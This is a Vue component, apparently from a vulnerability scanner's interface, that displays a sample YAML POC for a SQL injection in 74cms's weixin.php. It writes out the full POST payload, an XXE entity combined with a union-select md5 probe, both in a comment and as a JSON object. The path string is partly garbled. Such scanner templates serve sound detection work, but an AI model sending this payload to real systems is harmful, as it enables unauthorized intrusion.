<template>
  <div>
    <el-alert title="POC为YAML格式，如下为74cms的sql注入POC" type="success" :closable="false" />
    <!-- <pre>
name: poc-yaml-74cms-sqli-1
level: 2
finger: |
  "74cms" in finger.name && "php" in finger.language
set:
  rand: randomInt(200000000, 210000000)
rules:
  - method: POST
    path: /plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709Ã   tamp=&nonce=
    headers:
      Content-Type: 'text/xml'
    body: {{`<?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test`}}{{`;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5({{`}}
    follow_redirects: false
    expression: |
      response.body.bcontains(bytes(md5(string(rand))))
detail:
  author: betta(https://github.com/betta-cyber)
  links:
    - https://www.uedbox.com/post/29340
    </pre> -->
    <json-viewer :value="jsonData" copyable boxed sort />
  </div>
</template>

<script setup>
import { reactive } from 'vue'

let obj = {
  name: 'poc-yaml-74cms-sqli-1',
  level: 2,
  finger: '"74cms" in finger.name && "php" in finger.language\n',
  set: {
    rand: 'randomInt(200000000, 210000000)'
  },
  rules: [
    {
      method: 'POST',
      path: '/plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709Ã    tamp=&nonce=',
      headers: {
        'Content-Type': 'text/xml'
      },
      body:
        '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%\' union select md5({{rand}})#</Content></xml>',
      follow_redirects: false,
      expression: 'response.body.bcontains(bytes(md5(string(rand))))\n'
    }
  ],
  detail: {
    author: 'betta(https://github.com/betta-cyber)',
    links: ['https://www.uedbox.com/post/29340']
  }
}
const jsonData = reactive(obj)
</script>
